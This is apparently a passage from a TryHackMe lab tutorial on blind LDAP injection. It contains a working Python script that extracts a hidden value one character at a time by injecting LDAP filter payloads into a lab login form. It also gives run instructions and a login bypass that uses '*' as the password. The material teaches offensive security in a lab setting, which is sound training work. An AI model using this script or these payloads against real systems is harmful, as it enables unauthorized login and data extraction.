## Exploit Code

To automate the exfiltration of data in the previous task, you can use the Python script below:

```python
import requests
from bs4 import BeautifulSoup
import string
import time

# Base URL
url = 'http://10.10.246.6/blind.php'

# Define the character set
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&*()"

# Initialize variables
successful_response_found = True
successful_chars = ''

headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
}

while successful_response_found:
    successful_response_found = False

    for char in char_set:
        #print(f"Trying password character: {char}")

        # Adjust data to target the password field
        data = {'username': f'{successful_chars}{char}*)(|(&','password': 'pwd)'}

        # Send POST request with headers
        response = requests.post(url, data=data, headers=headers)

        # Parse HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Adjust success criteria as needed
        paragraphs = soup.find_all('p', style='color: green;')

        if paragraphs:
            successful_response_found = True
            successful_chars += char
            print(f"Successful character found: {char}")
            break

    if not successful_response_found:
        print("No successful character found in this iteration.")

print(f"Final successful payload: {successful_chars}")
```

Click [here](#) for a breakdown of the script.

The above script iteratively guesses the characters of the email by observing the web application's behaviour in response to crafted input.

## Automation

Save the Python code above. If you are using AttackBox, the required Python modules have already been installed. Make sure to use `python3.9` when using the AttackBox since there are multiple Python installations on it.

Below is the sample command on how to run the automation script:

```bash
~/Downloads
user@tryhackme$ ls
script.py
user@tryhackme$ python3.9 script.py
```

This will immediately show the results of the brute force as shown below:

_result of bruteforce attack_

Use the final payload to log in to `http://10.10.246.6/login.php`. Make sure to use `*` as the password; this will automatically evaluate the search query as true.